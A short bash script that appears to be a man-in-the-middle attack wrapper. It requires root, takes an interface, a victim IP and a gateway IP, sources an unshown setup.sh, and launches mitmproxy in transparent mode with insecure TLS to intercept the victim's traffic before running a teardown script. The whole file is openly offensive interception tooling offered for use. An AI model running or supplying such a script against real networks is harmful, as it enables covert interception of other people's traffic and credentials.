#!/bin/bash

# make sure we're running as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root."
   exit 1
fi

# give command-line arguments meaningful names
INTERFACE=$1
VICTIM_IP=$2
GATEWAY_IP=$3

source setup.sh

# launch mitmproxy
echo "[+] mitm'ing $VICTIM_IP on $INTERFACE"
./mitmproxy --mode transparent --ssl-insecure --showhost

source teardown.sh
